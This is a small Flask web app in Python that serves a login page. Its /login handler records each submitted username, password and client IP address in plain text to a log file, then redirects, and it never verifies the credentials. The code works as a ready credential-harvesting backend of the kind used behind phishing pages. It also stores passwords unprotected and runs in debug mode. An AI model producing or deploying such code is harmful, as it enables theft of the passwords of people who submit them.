from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

# Path to the log file
LOG_FILE = 'logins.log'

# Home route to serve the login page
@app.route('/')
def home():
    return render_template('index.html')

# Handle the login form submission
@app.route('/login', methods=['POST'])
def login():
    # Get the username and password from the form
    username = request.form['username']
    password = request.form['password']
    
    # Get the user's IP address
    user_ip = request.remote_addr
    
    # Log the username, password, and IP address in plain text (not secure!)
    with open(LOG_FILE, 'a') as log:
        log.write(f"Username: {username}, Password: {password}, IP Address: {user_ip}\n")
    
    # Redirect back to the home page or show a success page
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True)
